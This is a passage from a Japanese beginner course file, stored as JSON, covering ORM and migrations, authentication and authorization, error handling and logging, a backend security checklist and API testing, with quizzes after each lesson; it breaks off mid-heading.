     "body": "## このレッスンのゴール\n\n- ORM が何をしてくれるか、メリットと注意点を説明できる\n- SQLAlchemy のモデル定義と `select(...)` を読める\n- マイグレーションとは何か、なぜ必要か説明できる\n\n## ORM：表をクラスとして扱う\n\n**ORM**（Object-Relational Mapping）は、データベースの **テーブルをクラス、行をオブジェクト** として扱えるようにする道具です。SQL を直接書く代わりに、Python のコードで操作できます。\n\n| データベース | ORM（Python） |\n|---|---|\n| テーブル `tasks` | クラス `Task` |\n| 1 行 | `Task` のインスタンス |\n| 列 `title` | 属性 `task.title` |\n| 別のテーブルとのつながり | `task.assignee.name` のようにたどれる |\n\n## モデルの定義（SQLAlchemy 2.0）\n\n```python\nfrom sqlalchemy import String, ForeignKey, select\nfrom sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column, relationship, Session\n\nclass Base(DeclarativeBase):\n    pass\n\nclass User(Base):\n    __tablename__ = \"users\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    name: Mapped[str] = mapped_column(String(50))\n    tasks: Mapped[list[\"Task\"]] = relationship(back_populates=\"assignee\")\n\nclass Task(Base):\n    __tablename__ = \"tasks\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    title: Mapped[str] = mapped_column(String(100))\n    status: Mapped[str] = mapped_column(String(10), default=\"todo\")\n    assignee_id: Mapped[int | None] = mapped_column(ForeignKey(\"users.id\"))\n    assignee: Mapped[\"User | None\"] = relationship(back_populates=\"tasks\")\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `__tablename__ = \"tasks\"` | このクラスは tasks テーブル |\n| `Mapped[int]` | この属性は int（型ヒント） |\n| `mapped_column(primary_key=True)` | 主キーの列 |\n| `ForeignKey(\"users.id\")` | **外部キー**：users テーブルの id を指す。「このタスクの担当者」 |\n| `relationship(...)` | つながった相手を属性としてたどれるようにする |\n\n`User` と `Task` は **1 対多**（1 人のユーザーが、たくさんのタスクを持つ）の関係です。\n\n## 使ってみる\n\n```python\nwith Session(engine) as session:\n    ryo = User(name=\"Ryo\")\n    session.add(ryo)\n    session.add(Task(title=\"会場を探す\", assignee=ryo))\n    session.add(Task(title=\"チラシを作る\", assignee=ryo, status=\"done\"))\n    session.commit()\n\n    stmt = select(Task).where(Task.assignee_id == ryo.id, Task.status == \"todo\")\n    for task in session.scalars(stmt):\n        print(task.title, task.assignee.name)   # 会場を探す Ryo\n\n    print([t.title for t in ryo.tasks])         # ['会場を探す', 'チラシを作る']\n```\n\n裏では SQLAlchemy が SQL を作っています。`print(stmt)` で見ると、こうなっていました。\n\n```sql\nSELECT tasks.id, tasks.title, tasks.status, tasks.assignee_id\nFROM tasks\nWHERE tasks.assignee_id = :assignee_id_1 AND tasks.status = :status_1\n```\n\n`:assignee_id_1` はプレースホルダ（レッスン 7 の `?` と同じ）なので、**ORM を使うと SQL インジェクションも自然に防げます**。\n`Session` は「データベースとの 1 回分のやりとり」で、`commit()` で確定します（トランザクション）。\n\n## ORM のメリットと注意点\n\n| メリット | 注意点 |\n|---|---|\n| Python のクラスとして書ける。型ヒントでエディタが補完してくれる | 裏でどんな SQL が出ているか見えにくい |\n| PostgreSQL・SQLite などの違いを吸収してくれる | `task.assignee` を何百回もたどると、そのたびに SQL が飛んで遅くなる（**N+1 問題**、レッスン 14） |\n| プレースホルダが自動で使われる | 複雑な集計は SQL を直接書いた方が分かりやすいこともある |\n\n**ORM を使っていても、SQL の基本（レッスン 7）を知っていると、遅い・おかしいときに原因が分かります。**\n\n## マイグレーション：テーブルの変更履歴\n\nアプリを作っていると、「タスクに締め切り（due）の列を足したい」のように、**テーブルの形を変えたくなります**。\nでも本番のデータベースにはすでにデータが入っているので、作り直すわけにはいきません。\n\nそこで、**テーブルの変更を、順番付きの小さなスクリプトとして残しておく** のがマイグレーションです。Git の「コミット」のデータベース版だと考えると分かりやすいです。\n\n```text\nmigrations/\n├── 0001_create_users_and_tasks.py\n├── 0002_add_due_to_tasks.py        ← 新しく足した変更\n```\n\nSQLAlchemy では **Alembic** という道具を使います。\n\n```bash\nalembic revision --autogenerate -m \"add due to tasks\"   # モデルとの差分から変更ファイルを作る\nalembic upgrade head                                     # まだ当てていない変更を全部当てる\nalembic downgrade -1                                     # 1 つ戻す\n```\n\n作られるファイルの中身はこんな形です。\n\n```python\ndef upgrade():\n    op.add_column(\"tasks\", sa.Column(\"due\", sa.Date(), nullable=True))\n\ndef downgrade():\n    op.drop_column(\"tasks\", \"due\")\n```\n\n`upgrade`（進める）と `downgrade`（戻す）がセットになっています。\n\n⚠️ AI に「列を消して」「型を変えて」と頼んだときは、**マイグレーションでデータが消えないか**（`drop_column` など）を必ず確認しましょう。本番で実行する前にバックアップを取るのが鉄則です。\n\n## 他の言語では\n\n| 言語 | ORM | マイグレーション |\n|---|---|---|\n| Python | SQLAlchemy、Django ORM | Alembic、Django の `makemigrations` |\n| TypeScript | Prisma、Drizzle、TypeORM | `prisma migrate` など |\n| Ruby | Active Record（Rails） | `rails db:migrate` |\n| PHP | Eloquent（Laravel） | `php artisan migrate` |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "ORM で `Task` クラスのインスタンス 1 つは、データベースの何にあたる？",
        "choices": [
         "テーブル全体",
         "tasks テーブルの 1 行",
         "1 つの列"
        ],
        "answer": 1,
        "explain": "クラスがテーブル、インスタンスが行、属性が列です。"
       },
       {
        "question": "`ForeignKey(\"users.id\")` の意味は？",
        "choices": [
         "この列は users テーブルの id を指している（どのユーザーのものか）",
         "users テーブルを削除する",
         "id を自動で振る"
        ],
        "answer": 0,
        "explain": "外部キーで、別のテーブルとのつながりを表します。"
       },
       {
        "question": "マイグレーションを使う一番の理由は？",
        "choices": [
         "SQL を書かなくて済むから",
         "データを残したまま、テーブルの形の変更を順番に・やり直せる形で当てるため",
         "データベースを速くするため"
        ],
        "answer": 1,
        "explain": "テーブルの形の変更履歴を、Git のように管理する仕組みです。"
       }
      ]
     ],
     "id": "08-orm-migration"
    },
    {
     "title": "認証と認可 ― ログインと権限",
     "level": 2,
     "minutes": 22,
     "concepts": [
      "auth",
      "security",
      "backend"
     ],
     "summary": "「あなたは誰？」（認証）と「それをしてよい？」（認可）。パスワードの保存方法、セッションとトークン（JWT）。",
     "body": "## このレッスンのゴール\n\n- 認証と認可の違いを説明できる\n- パスワードを「ハッシュ化」して保存する理由が分かる\n- セッション（Cookie）とトークン（JWT）の違いを説明できる\n- 「他人のデータを見られない」ためのチェックを読める\n\n## 認証と認可\n\n| | 認証（Authentication） | 認可（Authorization） |\n|---|---|---|\n| 問い | **あなたは誰？** | **それをしてよい？** |\n| 例 | ユーザー名とパスワードでログイン | 自分のタスクは消せるが、他人のタスクは消せない |\n| 失敗したら | `401 Unauthorized` | `403 Forbidden`（または、存在を隠すため `404`） |\n\npopup2027 の「あなたは誰？」で名前を選ぶ仕組みは、**認証ではありません**（誰でもどの名前でも選べる）。本当の認証には、本人しか知らない・持っていないもので確かめる必要があります。\n\n## パスワードは「そのまま」保存しない\n\nデータベースが盗まれても、パスワードがばれないようにする必要があります。そこで **ハッシュ化** します。\n\n```python\nimport bcrypt\n\nhashed = bcrypt.hashpw(\"hana-2027\".encode(), bcrypt.gensalt())\n# b'$2b$12$1BfUQb7JcWaT5...'（60 文字。毎回違う文字列になる）\n\nbcrypt.checkpw(\"hana-2027\".encode(), hashed)   # True\nbcrypt.checkpw(\"wrong\".encode(), hashed)       # False\n```\n\n- **ハッシュ**：元に戻せない変換。ログインのときは、入力を同じ方法で変換して **一致するか** だけを比べる\n- **ソルト**（`gensalt()`）：ランダムな値を混ぜ、同じパスワードでも毎回違う結果にする（よくあるパスワードの一覧表で一気に解読されるのを防ぐ）\n- **わざと遅い計算**（bcrypt・Argon2 など）を使う。`$12$` は計算の重さ。総当たりで試されても時間がかかるように\n\n⚠️ AI のコードで、パスワードをそのまま保存している・`md5` や `sha256` だけで済ませている、のを見たら要注意です。\n\n## ログイン状態を覚える 2 つの方法\n\nHTTP は前のリクエストを覚えていない（レッスン 3）ので、ログインしたことを毎回伝える必要があります。\n\n### ① セッション ＋ Cookie\n\n```text\nログイン成功 → サーバーが「整理券」（セッション ID）を発行して保存\n            → レスポンスの Set-Cookie: session_id=abc123 でブラウザに渡す\n以後のリクエスト → ブラウザが自動で Cookie: session_id=abc123 を付ける\n             → サーバーは保存してある整理券と照合して「Ryo さんだ」と分かる\n```\n\n- サーバーが「誰がログイン中か」を覚えておく\n- ログアウトさせたいときは、サーバー側で整理券を消せばよい\n- 普通の Web サイトの定番\n\nCookie には安全のための設定を付けます。\n\n| 設定 | 意味 |\n|---|---|\n| `HttpOnly` | JavaScript から読めない（XSS で盗まれにくい） |\n| `Secure` | https のときだけ送る |\n| `SameSite=Lax` | 他のサイトからのリクエストには付けない（なりすましの攻撃を防ぐ） |\n\n### ② トークン（JWT）\n\n```python\nimport jwt\nfrom datetime import datetime, timedelta, timezone\n\npayload = {\"sub\": \"1\", \"exp\": datetime.now(timezone.utc) + timedelta(hours=1)}\ntoken = jwt.encode(payload, SECRET_KEY, algorithm=\"HS256\")\n# 'eyJhbGciOi...' （ヘッダー.中身.署名 の 3 つを . でつないだ文字列）\n```\n\n- サーバーは何も覚えず、**署名付きの「通行証」** を渡す\n- 以後のリクエストで `Authorization: Bearer <トークン>` を付けてもらう\n- サーバーは **署名を確かめる** だけで、「改ざんされていない、Ryo さん（sub: 1）の、期限内の通行証だ」と分かる\n- スマホアプリや、サーバー同士の API でよく使う\n\n⚠️ JWT の中身は **暗号化ではなく、誰でも読める**（Base64 という変換をしているだけ）。パスワードなどの秘密を入れてはいけません。\n⚠️ `SECRET_KEY` が漏れると、誰でも通行証を偽造できます。環境変数に置き、十分に長いランダムな値にします（短すぎるとライブラリが警告を出すことも確認しました）。\n\n```bash\npython -c \"import secrets; print(secrets.token_urlsafe(32))\"\n```\n\n| | セッション | JWT |\n|---|---|---|\n| サーバーが覚えること | 誰がログイン中か | 何も覚えない（署名の鍵だけ） |\n| すぐにログアウトさせる | 簡単（整理券を消す） | 難しい（期限が切れるまで有効。期限を短くするなどの工夫が要る） |\n| 向いている場面 | ブラウザの Web サイト | スマホアプリ・API |\n\n## FastAPI での形\n\n```python\nfrom fastapi import Depends, FastAPI, HTTPException\nfrom fastapi.security import HTTPAuthorizationCredentials, HTTPBearer\n\nbearer = HTTPBearer()\n\ndef get_current_user_id(cred: HTTPAuthorizationCredentials = Depends(bearer)) -> int:\n    try:\n        payload = jwt.decode(cred.credentials, SECRET_KEY, algorithms=[\"HS256\"])\n    except jwt.PyJWTError:\n        raise HTTPException(status_code=401, detail=\"ログインし直してください\")\n    return int(payload[\"sub\"])\n\n@app.get(\"/tasks/{task_id}\")\ndef get_task(task_id: int, user_id: int = Depends(get_current_user_id)):\n    task = TASKS.get(task_id)\n    if task is None or task[\"owner_id\"] != user_id:          # ← 認可\n        raise HTTPException(status_code=404, detail=\"タスクが見つかりません\")\n    return task\n```\n\n- `Depends(...)`：「この関数を呼ぶ前に、まず `get_current_user_id` を実行して、その結果を渡して」という **依存性注入**。ログインが必要な API すべてに 1 行足すだけで済む\n- トークンが無い・偽物・期限切れなら 401（実際に試して確認済み）\n- **`task[\"owner_id\"] != user_id` のチェックが認可**。これが無いと、ログインさえすれば **URL の数字を変えるだけで他人のタスクが見えてしまう**\n\n最後の点はとても多い脆弱性（IDOR と呼ばれます）で、AI のコードでも抜けがちです。**「ログインしているか」だけでなく「その人のデータか」を確かめているか** を必ず見ましょう。\n\n## 自分で作らない、という選択\n\nログインの仕組みは、パスワード再設定・メール確認・2 段階認証・「Google でログイン」（OAuth）など、ちゃんと作ると大仕事で、間違えると被害が大きい部分です。\n実際の開発では、**Firebase Authentication、Supabase Auth、Auth0、Clerk** などの既製品を使うことが多いです。popup2027 に本当のログインを付けるなら、Firebase Authentication が一番の近道です。\n\n「Google でログイン」「Microsoft でサインイン」の裏側で何が起きているか（OAuth と OpenID Connect）は、レッスン 18 で詳しく見ます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「ログインはしているが、他人のタスクを消そうとした」ときに返すのに合うのは？",
        "choices": [
         "401",
         "403（または存在を隠す 404）",
         "500"
        ],
        "answer": 1,
        "explain": "誰かは分かっているので 401 ではありません。権限が無いので 403、存在自体を隠したいなら 404 です。"
       },
       {
        "question": "パスワードをデータベースに保存する正しい方法は？",
        "choices": [
         "そのまま保存する",
         "暗号化して、鍵を同じサーバーに置く",
         "bcrypt などでハッシュ化して保存する"
        ],
        "answer": 2,
        "explain": "ハッシュは元に戻せないので、データベースが盗まれてもパスワードがすぐには分かりません。"
       },
       {
        "question": "JWT について正しいのは？",
        "choices": [
         "中身は誰でも読めるので、秘密の情報を入れてはいけない",
         "中身は暗号化されているので何を入れても安全",
         "サーバーにすべての JWT を保存しておく必要がある"
        ],
        "answer": 0,
        "explain": "署名で改ざんは防げますが、中身は Base64 で誰でも読めます。"
       },
       {
        "question": "`GET /tasks/11` で、ログインはチェックしているが持ち主のチェックが無い。何が起きる？",
        "choices": [
         "ログインした人なら、数字を変えるだけで他人のタスクが見える",
         "自動で自分のタスクだけになる",
         "必ず 401 になる"
        ],
        "answer": 0,
        "explain": "認可（その人のデータかの確認）が抜けた、よくある脆弱性です。"
       }
      ]
     ],
     "id": "09-auth"
    },
    {
     "title": "エラー処理とログ",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "errors",
      "backend",
      "security"
     ],
     "summary": "失敗を正しいステータスで返し、利用者には必要なことだけ、開発者にはログで詳しく伝える。",
     "body": "## このレッスンのゴール\n\n- 「利用者に見せるエラー」と「ログに残すエラー」を分ける理由を説明できる\n- FastAPI の例外ハンドラを読める\n- 良いログ・悪いログを見分けられる\n\n## エラーは 2 人に向けて出す\n\n| 相手 | 知りたいこと | 出す場所 |\n|---|---|---|\n| **利用者（フロントエンド）** | 何がダメで、どうすれば直るか | レスポンス（ステータス ＋ 短いメッセージ） |\n| **開発者（あなた・AI）** | どこで、なぜ失敗したか（細かい情報） | **ログ** |\n\nこの 2 つを混ぜてはいけません。たとえば 500 エラーのときに、プログラムの中身（どのファイルの何行目か・SQL 文・設定値）をレスポンスに出すと、**攻撃者にヒントを与えてしまいます**。\n\nFastAPI は、想定外のエラーが起きると、利用者には `500 Internal Server Error` という文字だけを返します（実際に `1 / 0` を起こして確認しました）。詳しい内容はサーバーのログにだけ出ます。\n\n## 想定内のエラーは、決まった形で返す\n\n```python\nclass TaskNotFound(Exception):\n    def __init__(self, task_id: int):\n        self.task_id = task_id\n\n@app.exception_handler(TaskNotFound)\nasync def task_not_found_handler(request: Request, exc: TaskNotFound):\n    return JSONResponse(\n        status_code=404,\n        content={\"error\": {\"code\": \"task_not_found\", \"message\": f\"タスク {exc.task_id} はありません\"}},\n    )\n\n@app.get(\"/tasks/{task_id}\")\ndef get_task(task_id: int, db = Depends(get_db)):\n    row = db.execute(\"SELECT id, title FROM tasks WHERE id = ?\", (task_id,)).fetchone()\n    if row is None:\n        raise TaskNotFound(task_id)\n    return {\"id\": row[0], \"title\": row[1]}\n```\n\n- 自分用の例外（`TaskNotFound`）を作り、`raise` するだけにする\n- `@app.exception_handler(...)` で、その例外を **どんなレスポンスにするか** を 1 か所にまとめる\n- どの API でも同じ形のエラー（レッスン 4 の `code` ＋ `message`）が返るので、フロントエンドが扱いやすい\n\n## どのステータスを返すか\n\n| 状況 | ステータス |\n|---|---|\n| 形がおかしい・検証で不合格 | 400 / 422 |\n| ログインしていない | 401 |\n| 権限が無い | 403（隠したいなら 404） |\n| 見つからない | 404 |\n| すでにある・同時に更新された（例：同じメールアドレスで登録） | 409 |\n| 呼びすぎ | 429 |\n| 想定外のバグ | 500（**利用者には詳細を見せない**） |\n| 外部サービス（Notion・決済など）が落ちている | 502 / 503 |\n\n**「何でも 500」「何でも 200 で `{\"ok\": false}`」は避けましょう**。ステータスで分かれていると、リトライしてよいか（5xx）、入力を直すべきか（4xx）が呼ぶ側で判断できます。\n\n## ログ：開発者への手紙\n\n```python\nimport logging\nlog = logging.getLogger(\"app\")\n\nlog.info(\"task created id=%s user=%s\", task_id, user_id)\nlog.warning(\"notion api slow elapsed_ms=%d\", elapsed)\nlog.exception(\"failed to send email task_id=%s\", task_id)   # except の中で使うと、エラーの詳細も残る\n```\n\n| レベル | 使いどころ |\n|---|---|\n| `DEBUG` | 開発中だけ見たい細かい情報 |\n| `INFO` | 普通の出来事（作成した・ログインした） |\n| `WARNING` | 気をつけたいが動いている（遅い・リトライした） |\n| `ERROR` | 失敗した |\n| `CRITICAL` | サービス全体が危ない |\n\nfashion_news が `log.info(\"%s: %d件\", ...)` や `log.warning(...)` を使っていたのは、GitHub Actions のログで後から確認するためでした。\n\n### 良いログの条件\n\n- **後から検索できる**：`task created id=42 user=1` のように、何が・どれが、が分かる。本番では JSON の形で出すことも多い\n- **1 つのリクエストを追える**：リクエストごとの ID（リクエスト ID）を全部のログに付けておくと、「このエラーの直前に何があったか」をたどれる\n- **時刻とレベルが付いている**\n\n### 書いてはいけないもの\n\n- ❌ パスワード・トークン・API キー（`log.info(\"login %s %s\", user, password)`）\n- ❌ クレジットカード番号など、必要以上の個人情報\n- ❌ `print()` だけで済ませる（レベル分けや出力先の切り替えができない）\n\nAI のコードで、デバッグ用の `print(request_body)` が残っていたら、秘密が混ざっていないか確認しましょう。\n\n## エラーを握りつぶさない\n\n```python\ntry:\n    send_email(user)\nexcept Exception:\n    pass          # ❌ 失敗に誰も気づけない\n```\n\n```python\ntry:\n    send_email(user)\nexcept EmailError:\n    log.exception(\"failed to send email user=%s\", user.id)   # ⭕ 記録して、\n    # 必要ならリトライ用に印を付ける、利用者に「メールは後で送ります」と伝える、など\n```\n\nPython コースの「例外処理」で学んだ `except Exception: pass` の危うさは、バックエンドでは特に重大です。誰も画面を見ていないので、**ログに残らない失敗は、無かったことになってしまいます**。\n\n## 本番では「見張り」を付ける\n\nログは出しているだけでは誰も読みません。本番では次のような道具で、問題が起きたら知らせてもらいます。\n\n- **エラー監視**（Sentry など）：500 が起きたら、エラーの詳細と一緒に通知\n- **死活監視**：数分ごとにアクセスして、応答が無ければ通知\n- **ログの集約**（クラウドのログ画面など）：複数のサーバーのログをまとめて検索\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "500 エラーのレスポンスに、SQL 文やファイルの行番号を含めるべき？",
        "choices": [
         "含めるべき。利用者が原因を調べられるから",
         "含めない。詳細はログにだけ残す"
        ],
        "answer": 1,
        "explain": "中身の情報は攻撃者へのヒントになります。"
       },
       {
        "question": "同じメールアドレスでユーザー登録しようとした。合うステータスは？",
        "choices": [
         "500",
         "409",
         "200"
        ],
        "answer": 1,
        "explain": "すでにあるものとぶつかった（衝突）ので 409 Conflict が合います。"
       },
       {
        "question": "ログに書いてはいけないものは？",
        "choices": [
         "タスクの ID",
         "処理にかかった時間",
         "ログイン時に入力されたパスワード"
        ],
        "answer": 2,
        "explain": "ログは多くの人や道具が読むので、秘密情報を書いてはいけません。"
       }
      ]
     ],
     "id": "10-errors-logging"
    },
    {
     "title": "バックエンドのセキュリティ定番 10",
     "level": 3,
     "minutes": 22,
     "concepts": [
      "security",
      "backend",
      "auth"
     ],
     "summary": "AI のバックエンドを確認するときに必ず見たい、代表的な攻撃と守り方のチェックリスト。",
     "body": "## このレッスンのゴール\n\n- 代表的な攻撃（SQL インジェクション・XSS・CSRF・IDOR など）の名前と仕組みをざっくり説明できる\n- AI が書いたバックエンドを、チェックリストで点検できる\n\nこれまでのレッスンに出てきたものも含めて、**よくある 10 個** にまとめます。全部を深く理解できなくても、「この観点で見る」と知っているだけで大きく違います。\n\n## ① SQL インジェクション\n\n入力した文字が SQL の命令として解釈されてしまう攻撃（レッスン 7）。\n\n```python\ndb.execute(f\"SELECT * FROM users WHERE name = '{name}'\")      # ❌\ndb.execute(\"SELECT * FROM users WHERE name = ?\", (name,))     # ⭕\n```\n\n**守り方**：プレースホルダか ORM を使う。SQL に f-string・`+`・`%` で値を埋め込まない。\n\n## ② 認可漏れ（IDOR）\n\nログインしていれば、URL の数字を変えるだけで他人のデータが見える・変えられる（レッスン 9）。\n\n```python\ntask = db.get(Task, task_id)\nif task.owner_id != current_user.id:      # ← この確認があるか\n    raise HTTPException(404)\n```\n\n**守り方**：すべての取得・更新・削除で「その人のデータか」を確かめる。データベースから取るときに `WHERE owner_id = ?` を付けるのが確実。\n\n## ③ パスワードの保存ミス\n\n**守り方**：bcrypt・Argon2 でハッシュ化（レッスン 9）。そのまま・md5 だけ、は NG。ログイン失敗が続いたら待たせる・ロックする。\n\n## ④ 秘密情報の漏えい\n\nAPI キー・データベースのパスワード・JWT の鍵がコードや Git に入っている。\n\n**守り方**：環境変数や、クラウドの「シークレット管理」に置く。`.env` は `.gitignore` に入れる（AI と開発するコース「秘密情報と環境変数」）。漏れたらすぐ無効化。\n\n## ⑤ XSS（クロスサイトスクリプティング）\n\n利用者が入力した `<script>` などが、他の人の画面でプログラムとして動いてしまう。\n\n**守り方**：表示するときに無害化する（popup2027 の `esc()`）。React などは自動で無害化してくれる。サーバー側では、入力を検証し、レスポンスの `Content-Type` を正しく返す。\n\n## ⑥ CSRF（クロスサイト・リクエスト・フォージェリ）\n\nログイン中の利用者が、悪いサイトを開いただけで、知らないうちに「送金」などのリクエストを送らされてしまう攻撃。Cookie が自動で付くことを悪用します。\n\n**守り方**：Cookie に `SameSite=Lax`（または `Strict`）を付ける。データを変える操作は GET にしない（レッスン 3）。フレームワークの CSRF 対策（トークン）を使う。\n\n## ⑦ CORS の設定ミス\n\nブラウザは基本的に、**別のサイト（オリジン）の API の結果を JavaScript で読むこと** を止めています。それを「このサイトからなら許す」と緩める設定が **CORS** です。\n\n```python\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"https://myapp.example.com\"],   # ⭕ 自分のフロントエンドだけ\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n```\n\nAI は「CORS エラーが出た」と言われると、`allow_origins=[\"*\"]`（どこからでも OK）にしがちです。**ログインのある API で「どこからでも」は危険** なので、自分のサイトの URL だけを書くようにしましょう。\n\n## ⑧ 呼ばれすぎ（レート制限が無い）\n\nログイン API を 1 秒に何千回も呼ばれてパスワードを総当たりされる、AI の API を大量に呼ばれて請求が膨らむ、など。\n\n**守り方**：1 人（1 IP）あたりの回数制限をかけ、超えたら `429`。ログイン・登録・メール送信・AI 呼び出しなど、**お金や安全に関わる API は特に**。\n\n## ⑨ 入力の大きさ・種類の制限が無い\n\n1GB の JSON、巨大な画像、想定外のファイル形式（画像のふりをしたプログラム）。\n\n**守り方**：文字数・件数・ファイルサイズに上限を付ける（レッスン 6 の `max_length`）。アップロードはファイルの種類を確かめ、元のファイル名をそのまま使わない。\n\n## ⑩ 古いライブラリ\n\n使っているライブラリに見つかった穴（脆弱性）を、そのままにしている。\n\n**守り方**：`pip list --outdated` や `npm audit`、GitHub の Dependabot で定期的に更新する。AI が提案したライブラリは、本物か・今も更新されているかを確認する（AI と開発するコース「AI の得意・苦手」）。\n\n## チェックリスト（AI のバックエンドを読むとき）\n\n| # | 見るところ | 確認すること |\n|---|---|---|\n| 1 | SQL を書いている所 | `?`・ORM を使っているか。f-string で埋め込んでいないか |\n| 2 | 取得・更新・削除の API | 持ち主・権限の確認があるか |\n| 3 | ユーザー登録・ログイン | パスワードをハッシュ化しているか。回数制限があるか |\n| 4 | 設定・定数 | 秘密がコードに直書きされていないか |\n| 5 | HTML を返す・表示する所 | 無害化しているか |\n| 6 | Cookie の設定 | `HttpOnly`・`Secure`・`SameSite` |\n| 7 | CORS の設定 | `allow_origins=[\"*\"]` になっていないか |\n| 8 | お金・安全に関わる API | 回数制限 |\n| 9 | 入力の受け取り | 長さ・サイズ・種類の上限 |\n| 10 | `requirements.txt` / `package.json` | 古すぎるもの・聞いたことのないものが無いか |\n\nAI に「このコードを、OWASP の観点でセキュリティレビューして」と頼むのも有効です（**OWASP** は Web のセキュリティの代表的な指針を出している団体です）。ただし最終確認は、このチェックリストで自分の目でも。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「CORS エラーが出るので allow_origins を [\"*\"] にしました」と AI が言った。ログインのある API で問題になりうる？",
        "choices": [
         "なりうる。どのサイトからでも API を使えてしまう",
         "ならない。CORS はセキュリティに関係ない"
        ],
        "answer": 0,
        "explain": "自分のフロントエンドの URL だけを許可するのが基本です。"
       },
       {
        "question": "ログイン API にレート制限を付ける主な理由は？",
        "choices": [
         "サーバーの電気代を節約するため",
         "パスワードの総当たりを防ぐため",
         "ログを減らすため"
        ],
        "answer": 1,
        "explain": "短い時間に何度も試せないようにして、総当たり攻撃を防ぎます。"
       },
       {
        "question": "次のうち、SQL インジェクションの心配がある書き方は？",
        "choices": [
         "db.execute(\"SELECT * FROM t WHERE id = ?\", (id,))",
         "db.execute(\"SELECT * FROM t WHERE id = \" + id)",
         "session.scalars(select(T).where(T.id == id))"
        ],
        "answer": 1,
        "explain": "文字列をつなげて SQL を作ると、入力が命令として解釈される危険があります。"
       }
      ]
     ],
     "id": "11-security"
    },
    {
     "title": "API のテスト",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "testing",
      "backend",
      "database"
     ],
     "summary": "TestClient で API を呼んで確かめる。テスト用のデータベースへの差し替えと、何をテストすべきか。",
     "body": "## このレッスンのゴール\n\n- API のテストコード（pytest ＋ TestClient）を読める\n- テストのときに本物のデータベースを使わない工夫（差し替え）が分かる\n- 「何をテストすべきか」の定番を挙げられる\n\n## API のテスト＝偽物のブラウザで呼んでみる\n\nAI と開発するコース「テストで AI のコードを確かめる」では、関数を直接呼んで `assert` しました。\nAPI の場合は、**サーバーを起動せずに、偽物のクライアントから HTTP リクエストを送って** 確かめます。\n\n```python\nfrom fastapi.testclient import TestClient\nfrom app import app\n\nclient = TestClient(app)\n\ndef test_create_and_get_task():\n    res = client.post(\"/tasks\", json={\"title\": \"会場を探す\"})\n    assert res.status_code == 201\n    task_id = res.json()[\"id\"]\n\n    res = client.get(f\"/tasks/{task_id}\")\n    assert res.status_code == 200\n    assert res.json()[\"title\"] == \"会場を探す\"\n```\n\n確かめているのは、**ステータスコード** と **返ってきた JSON の中身** の 2 つです。これはフロントエンドが実際に頼りにしている「約束」そのものです。\n\n## 本物のデータベースを使わない\n\nテストのたびに本物のデータベースにタスクが増えていくのは困ります。そこで、**テストの間だけ、データベースを使い捨てのものに差し替えます**。\n\nアプリ側は、データベースの接続を `Depends(get_db)` で受け取るように作っておきます。\n\n```python\ndef get_db():\n    conn = sqlite3.connect(\"app.db\")\n    try:\n        yield conn          # ← この接続を API の関数に渡す\n    finally:\n        conn.close()        # ← リクエストが終わったら閉じる\n\n@app.post(\"/tasks\", status_code=201)\ndef create_task(body: TaskCreate, db = Depends(get_db)):\n    ...\n```\n\nテスト側で、`get_db` を **差し替え** ます。\n\n```python\nimport pytest\n\n@pytest.fixture\ndef client(tmp_path):\n    conn = sqlite3.connect(tmp_path / \"test.db\", check_same_thread=False)\n    conn.execute(\"CREATE TABLE tasks (id INTEGER PRIMARY KEY, title TEXT NOT NULL)\")\n\n    def override_get_db():\n        yield conn\n\n    app.dependency_overrides[get_db] = override_get_db    # ← 差し替え\n    yield TestClient(app)\n    app.dependency_overrides.clear()                       # ← 元に戻す\n    conn.close()\n\ndef test_create_and_get_task(client):\n    ...\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `@pytest.fixture` | テストの **準備と後片付け** をまとめた関数。テストの引数に `client` と書くと自動で渡される |\n| `tmp_path` | pytest が用意してくれる、テストごとの使い捨てフォルダ |\n| `yield` | ここでテストを実行し、終わったら続き（後片付け）を実行する |\n| `app.dependency_overrides[get_db] = ...` | 「`get_db` の代わりにこちらを使って」 |\n\nレッスン 9 の `Depends` は、ログインのチェックだけでなく、**テストで部品を差し替えやすくする** ためにも役立っているのです。\n\nこのレッスンのテストは、実際に 4 つとも通ることを確認しました。\n\n```text\n$ pytest -q\n....                                   [100%]\n4 passed in 0.27s\n```\n\n## 何をテストすべきか\n\n「うまくいく場合」だけでなく、**断るべきものをちゃんと断るか** が大事です。\n\n| 種類 | 例 | 期待 |\n|---|---|---|\n| 正常 | 正しいデータでタスクを作る | 201 と中身 |\n| 検証 | タイトルが空 | 422 |\n| 存在しない | `GET /tasks/999` | 404 |\n| 認証 | トークン無しで呼ぶ | 401 |\n| **認可** | **他人のタスクを取得・削除** | **403 / 404** |\n| 境界 | 100 文字ちょうど・101 文字 | 通る・断る |\n| 副作用 | 作成したら通知が送られる | 通知の記録が増えている |\n\n特に **認可のテスト**（他人のデータを触れないこと）は、AI のコードで抜けやすく、抜けると被害が大きいので必ず入れてもらいましょう。\n\n## テストの種類\n\n| 種類 | 何を | 速さ |\n|---|---|---|\n| 単体テスト | 関数 1 つ（計算・変換） | とても速い |\n| **API テスト（結合テスト）** | API を呼んで、データベースまで通して確かめる | 速い |\n| E2E テスト | 本物のブラウザで画面を操作する（Playwright など） | 遅い |\n\nバックエンドでは **API テストを中心に** 書くと、少ない量で安心感が大きくなります。\n\n## 自動で毎回実行する（CI）\n\n```yaml\n# .github/workflows/test.yml\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with: { python-version: \"3.12\" }\n      - run: pip install -r requirements-dev.txt\n      - run: pytest\n```\n\npush のたびに GitHub Actions でテストを実行し、失敗したら分かるようにする仕組みを **CI**（継続的インテグレーション）と呼びます。fashion_news の解説で「テストを自動で動かす設定が無い」と書いたのは、これのことです。\n\n## JavaScript 